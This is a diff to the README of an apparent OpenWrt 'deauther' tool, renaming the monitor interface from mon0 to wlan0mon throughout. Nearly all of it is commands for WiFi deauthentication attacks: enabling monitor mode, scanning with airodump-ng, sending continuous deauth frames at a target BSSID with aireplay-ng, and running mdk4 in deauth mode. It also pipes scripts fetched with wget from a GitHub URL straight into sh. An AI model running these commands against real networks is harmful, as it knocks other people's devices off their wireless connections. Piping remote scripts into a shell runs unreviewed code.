@@ -28,23 +28,23 @@ opkg update && wget -qO- https://raw.githubusercontent.com/xiv3r/openwrt-deauthe
 
 # Using aireplay-ng 
 ```sh
-sh mon0.sh && airodump-ng mon0
+sh wlan0mon.sh && airodump-ng wlan0mon
 ```
 > ctrl + c
 ```sh
-aireplay-ng --deauth 0 -a (Mac BSSID)
+aireplay-ng wlan0mon --deauth 0 -a (Mac BSSID)
 ```
 # Monitor Mode 
 ```sh
-wget -qO- https://raw.githubusercontent.com/xiv3r/openwrt-deauther/refs/heads/main/mon0.sh | sh
+wget -qO- https://raw.githubusercontent.com/xiv3r/openwrt-deauther/refs/heads/main/wlan0mon.sh | sh
 ```
 # Run
 ```sh
-sh mon0.sh
+sh wlan0mon.sh
 ```
 # Using mdk4
 ```sh
-sh mon.sh && mdk4 mon0 d
+sh wlan0mon.sh && mdk4 wlan0mon d
 ```
 ## Manual
 > More info
@@ -52,13 +52,13 @@ sh mon.sh && mdk4 mon0 d
  - airodump-ng --help
  - aircrack-ng --help
 
-`iw phy phy0 interface add mon0 type monitor`
+`iw phy phy0 interface add wlan0mon type monitor`
 
-`ip link set mon0 up`
+`ip link set wlan0mon up`
 
-`airodump-ng mon0`
+`airodump-ng wlan0mon`
 
-`aireplay-ng mon0 --deauth 0 -a 32:AA:E4:18:90:45 --ignore-negative-one`
+`aireplay-ng wlan0mon --deauth 0 -a 32:AA:E4:18:90:45 --ignore-negative-one`
 
 - -a | bssid -a (32:AA:E4:18:90:45)
 
